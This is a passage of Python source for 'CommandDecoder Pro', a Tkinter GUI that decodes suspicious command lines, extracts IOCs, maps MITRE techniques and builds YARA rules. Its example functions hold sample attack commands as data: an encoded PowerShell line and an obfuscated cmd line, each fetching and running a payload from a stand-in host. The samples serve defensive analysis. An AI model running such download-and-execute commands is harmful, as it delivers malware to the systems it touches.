    def export_iocs(self):
        """Placeholder for exporting IOCs"""
        self.status.config(text="Export IOCs feature not implemented yet.")
        messagebox.showinfo("Export IOCs", "This feature is under development.")
    
    def ioc_lookup(self):
        """Placeholder for IOC lookup"""
        self.status.config(text="IOC Lookup feature not implemented yet.")
        messagebox.showinfo("IOC Lookup", "This feature is under development.")
    
    def update_mitre_tab(self, ttps):
        # Save for later use
        self.current_ttps = ttps
        
        # Clear existing items
        for item in self.mitre_tree.get_children():
            self.mitre_tree.delete(item)
        
        # Add new MITRE techniques
        for ttp in ttps:
            mitre_id = ttp["id"]
            if mitre_id in MITRE_TTP_DB:
                self.mitre_tree.insert("", "end", values=(
                    mitre_id,
                    MITRE_TTP_DB[mitre_id]["name"],
                    ttp["confidence"],
                    MITRE_TTP_DB[mitre_id].get("description", "No description available")
                ))
    
    def update_behavior_tab(self, behaviors):
        # Update behavior indicators
        for behavior, level in behaviors.items():
            self.behavior_vars[behavior].set(level)
    
    def generate_yara_rules(self):
        """Generate YARA rules based on analysis results"""
        if not hasattr(self, 'current_iocs') or not self.current_iocs:
            messagebox.showinfo("YARA Rules", "No IOCs available to generate YARA rules")
            return
        
        self.yara_output.config(state="normal")
        self.yara_output.delete("1.0", tk.END)
        
        # Generate rule header
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        rule_name = "malicious_command_indicators"
        
        self.yara_output.insert(tk.END, f"rule {rule_name} {{\n")
        self.yara_output.insert(tk.END, f"    meta:\n")
        self.yara_output.insert(tk.END, f"        description = \"Command indicators detected by CommandDecoder\"\n")
        self.yara_output.insert(tk.END, f"        author = \"CommandDecoder Pro v2.0\"\n")
        self.yara_output.insert(tk.END, f"        date = \"{timestamp}\"\n")
        self.yara_output.insert(tk.END, f"        threat_level = {self.calculated_score:.1f}\n\n")
        
        # Strings section
        self.yara_output.insert(tk.END, "    strings:\n")
        
        # Add IOCs as strings
        for i, ioc in enumerate(self.current_iocs):
            if len(ioc["value"]) > 3:  # Skip very short strings
                # Escape special characters
                safe_value = ioc["value"].replace("\\", "\\\\").replace("\"", "\\\"")
                self.yara_output.insert(tk.END, f"        $s{i} = \"{safe_value}\" // {ioc['type']}\n")
        
        # Condition section
        self.yara_output.insert(tk.END, "\n    condition:\n")
        self.yara_output.insert(tk.END, "        any of them\n")
        self.yara_output.insert(tk.END, "}\n")
        
        self.yara_output.config(state="disabled")
        self.status.config(text="YARA rules generated based on analysis")
    
    # History management
    def save_to_history(self, cmd):
        """Save command to history with timestamp and hash"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cmd_hash = hashlib.sha256(cmd.encode()).hexdigest()[:8]
        
        entry = {
            "timestamp": timestamp,
            "command": cmd,
            "hash": cmd_hash
        }
        
        self.analysis_history.insert(0, entry)
        self.save_history_to_file()
        self.update_history_list()
    
    def update_history_list(self):
        """Update the history listbox"""
        self.history_list.delete(0, tk.END)
        for entry in self.analysis_history:
            display = f"{entry['timestamp']} [{entry['hash']}]: {entry['command'][:70]}{'...' if len(entry['command']) > 70 else ''}"
            self.history_list.insert(tk.END, display)
    
    def filter_history(self, event):
        """Filter history based on search term"""
        search_term = self.history_search.get().lower()
        self.history_list.delete(0, tk.END)
        
        for entry in self.analysis_history:
            if (search_term in entry['command'].lower() or 
                search_term in entry['timestamp'].lower() or 
                search_term in entry['hash'].lower()):
                
                display = f"{entry['timestamp']} [{entry['hash']}]: {entry['command'][:70]}{'...' if len(entry['command']) > 70 else ''}"
                self.history_list.insert(tk.END, display)
    
    def load_history(self):
        """Load selected history entry"""
        selection = self.history_list.curselection()
        if not selection:
            return
        
        index = selection[0]
        entry = self.analysis_history[index]
        
        self.cmd_input.delete("1.0", tk.END)
        self.cmd_input.insert(tk.END, entry["command"])
        self.status.config(text=f"Loaded command from {entry['timestamp']}")
    
    def clear_history(self):
        """Clear analysis history"""
        if messagebox.askyesno("Clear History", "Are you sure you want to clear all analysis history?"):
            self.analysis_history = []
            self.save_history_to_file()
            self.update_history_list()
            self.status.config(text="Analysis history cleared")
    
    def export_history(self):
        """Export history to file"""
        self.status.config(text="Export History feature not implemented yet.")
        messagebox.showinfo("Export History", "This feature is under development.")
    
    def save_history_to_file(self):
        """Save history to JSON file"""
        try:
            with open(self.history_file, "w") as f:
                json.dump(self.analysis_history, f, indent=2)
        except Exception as e:
            print(f"Error saving history: {e}")
    
    def load_history_from_file(self):
        """Load history from JSON file"""
        try:
            if os.path.exists(self.history_file):
                with open(self.history_file, "r") as f:
                    self.analysis_history = json.load(f)
        except:
            self.analysis_history = []
    
    # Menu functions
    def new_analysis(self):
        """Clear current analysis"""
        self.cmd_input.delete("1.0", tk.END)
        self.clean_output.config(state="normal")
        self.clean_output.delete("1.0", tk.END)
        self.clean_output.config(state="disabled")
        
        self.conclusion_output.config(state="normal")
        self.conclusion_output.delete("1.0", tk.END)
        self.conclusion_output.config(state="disabled")
        
        # Clear tables
        for item in self.ioc_tree.get_children():
            self.ioc_tree.delete(item)
        
        for item in self.mitre_tree.get_children():
            self.mitre_tree.delete(item)
        
        # Reset behavior indicators
        for var in self.behavior_vars.values():
            var.set("none")
        
        self.threat_level.config(text="⚪", fg="white")
        self.status.config(text="New analysis started")
    
    def save_results(self):
        """Save analysis results to file"""
        self.status.config(text="Save functionality not implemented in this demo")
    
    def open_network_analyzer(self):
        """Open network analysis tool"""
        self.status.config(text="Network Analyzer not implemented in this demo")
    
    def payload_extractor(self):
        """Open payload extraction tool"""
        self.status.config(text="Payload Extractor not implemented in this demo")
    
    def open_documentation(self):
        """Open documentation"""
        webbrowser.open("https://github.com/ritikshrivas/CommandDecoder")
        self.status.config(text="Opening documentation...")
    
    def show_about(self):
        """Show about dialog"""
        about = tk.Toplevel(self.root)
        about.title("About CommandDecoder Pro")
        about.geometry("500x400")
        about.configure(bg="#1e1e1e")
        about.resizable(False, False)
        
        # Center the window
        about.update_idletasks()
        width = about.winfo_width()
        height = about.winfo_height()
        x = (about.winfo_screenwidth() // 2) - (width // 2)
        y = (about.winfo_screenheight() // 2) - (height // 2)
        about.geometry(f'+{x}+{y}')
        
        # Header
        header = tk.Frame(about, bg="#007acc")
        header.pack(fill=tk.X)
        
        tk.Label(header, text="CommandDecoder Pro v2.0", font=("Segoe UI", 16, "bold"), 
                bg="#007acc", fg="white", pady=20).pack()
        
        # Content
        content = tk.Frame(about, bg="#1e1e1e", padx=20, pady=20)
        content.pack(fill=tk.BOTH, expand=True)
        
        # Developer info
        dev_frame = tk.Frame(content, bg="#1e1e1e")
        dev_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(dev_frame, text="Developed by:", bg="#1e1e1e", fg="#cccccc", 
               font=("Segoe UI", 10)).pack(anchor="w")
        
        tk.Label(dev_frame, text="Ritik Shrivas", bg="#1e1e1e", fg="#ffffff", 
               font=("Segoe UI", 12, "bold")).pack(anchor="w", padx=20, pady=(5, 0))
        
        # Description
        desc_frame = tk.Frame(content, bg="#1e1e1e")
        desc_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(desc_frame, text="Description:", bg="#1e1e1e", fg="#cccccc", 
               font=("Segoe UI", 10)).pack(anchor="w")
        
        desc_text = (
            "CommandDecoder Pro is an advanced command-line analysis tool designed to help "
            "security professionals analyze and decode malicious commands. It provides:\n\n"
            "• Command deobfuscation and decoding\n"
            "• IOC extraction and analysis\n"
            "• MITRE ATT&CK technique mapping\n"
            "• Threat scoring and behavior analysis\n"
            "• YARA rule generation\n"
        )
        
        desc_label = tk.Label(desc_frame, text=desc_text, bg="#1e1e1e", fg="#dcdcdc", 
                            justify=tk.LEFT, anchor="w", font=("Segoe UI", 9))
        desc_label.pack(fill=tk.X, padx=20, pady=5)
        
        # Copyright
        tk.Label(content, text="© 2023 Ritik Shrivas. All rights reserved.", 
               bg="#1e1e1e", fg="#aaaaaa", font=("Segoe UI", 9)).pack(side=tk.BOTTOM)
    
    # Example commands
    def load_powershell_example(self):
        example = """powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAHMAaQB0AGUALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXAB0AGUAbQBwAFwAYgBhAGQALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAHQAZQBtAHAAXABiAGEAZAAuAGUAeABlAA=="""
        self.cmd_input.delete("1.0", tk.END)
        self.cmd_input.insert(tk.END, example)
        self.status.config(text="PowerShell example loaded")
    
    def load_cmd_example(self):
        example = """cmd.exe /c set mz=power&& set dl=shell&& call echo %mz%%dl% -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')""" 
        self.cmd_input.delete("1.0", tk.END)
        self.cmd_input.insert(tk.END, example)
        self.status.config(text="CMD example loaded")
    
    def load_bash_example(self):
        example = """bash -c 'echo "ZWNobyAiSGVsbG8gV29ybGQhIiA+PiAvdG1wL3Rlc3QudHh0" | base64 -d | sh'"""
        self.cmd_input.delete("1.0", tk.END)
        self.cmd_input.insert(tk.END, example)
        self.status.config(text="Bash example loaded")
    
    def clear_input(self):
        self.cmd_input.delete("1.0", tk.END)
        self.status.config(text="Input cleared")
    
    # IOC context menu functions
    def show_ioc_menu(self, event):
        item = self.ioc_tree.identify_row(event.y)
        if item:
            self.ioc_tree.selection_set(item)
            self.ioc_menu.post(event.x_root, event.y_root)
    
    def copy_ioc_value(self):
        selected = self.ioc_tree.selection()
        if selected:
            item = self.ioc_tree.item(selected[0])
            self.root.clipboard_clear()
            self.root.clipboard_append(item['values'][2])
            self.status.config(text="IOC value copied to clipboard")
    
    def search_ioc_online(self):
        selected = self.ioc_tree.selection()
        if selected:
            item = self.ioc_tree.item(selected[0])
            ioc_value = item['values'][2]
            
            # Determine search URL based on IOC type
            ioc_type = item['values'][1]
            if ioc_type in ["URL", "Domain"]:
                url = f"https://www.virustotal.com/gui/domain/{ioc_value}"
            elif ioc_type == "IPv4":
                url = f"https://www.virustotal.com/gui/ip-address/{ioc_value}"
            elif ioc_type in ["MD5", "SHA1", "SHA256"]:
                url = f"https://www.virustotal.com/gui/file/{ioc_value}"
            else:
                url = f"https://www.google.com/search?q={urllib.parse.quote(ioc_value)}"
            
            webbrowser.open(url)
            self.status.config(text=f"Searching for IOC: {ioc_value}")
    
    # MITRE context menu functions
    def show_mitre_menu(self, event):
        item = self.mitre_tree.identify_row(event.y)
        if item:
            self.mitre_tree.selection_set(item)
            self.mitre_menu.post(event.x_root, event.y_root)
    
    def open_mitre_technique(self, event=None):
        selected = self.mitre_tree.selection()
        if selected:
            item = self.mitre_tree.item(selected[0])
            mitre_id = item['values'][0]
            
            if mitre_id in MITRE_TTP_DB:
                webbrowser.open(MITRE_TTP_DB[mitre_id]["url"])
                self.status.config(text=f"Opening MITRE technique: {mitre_id}")
    
    def open_mitre(self):
        webbrowser.open("https://attack.mitre.org/")
        self.status.config(text="Opened MITRE ATT&CK website")

if __name__ == "__main__":
    root = tk.Tk()
    app = CommandDecoderGUI(root)
    root.mainloop()
